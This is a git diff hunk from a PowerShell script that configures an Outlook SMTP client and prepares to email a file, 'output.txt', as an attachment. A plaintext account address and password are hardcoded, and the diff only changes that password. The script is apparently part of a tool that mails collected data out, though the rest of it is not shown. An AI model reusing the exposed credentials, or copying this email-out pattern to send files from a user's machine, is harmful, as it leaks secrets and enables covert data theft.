@@ -107,7 +107,7 @@ $SMTPServer = "smtp.outlook.com"
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
 $SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("HerbertSwindel@outlook.com", "HerbertdePervert69")
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("HerbertSwindel@outlook.com", "HerbertdePervert69@")
 
 # Send the email with attachment
 $Attachment = "$dir\output.txt"
